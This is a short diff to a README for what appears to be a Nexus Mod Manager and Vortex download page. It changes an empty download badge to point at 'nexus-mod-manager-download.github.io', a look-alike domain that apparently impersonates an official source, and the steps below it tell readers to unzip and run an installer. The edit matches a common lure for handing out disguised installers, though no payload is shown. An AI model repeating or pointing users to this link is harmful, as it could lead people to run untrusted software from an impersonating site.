@@ -10,7 +10,7 @@ Vortex expands on NMM with a modern interface, automatic updates, and enhanced c
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://nexus-mod-manager-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer for **Nexus Mod Manager** or **Vortex**.  
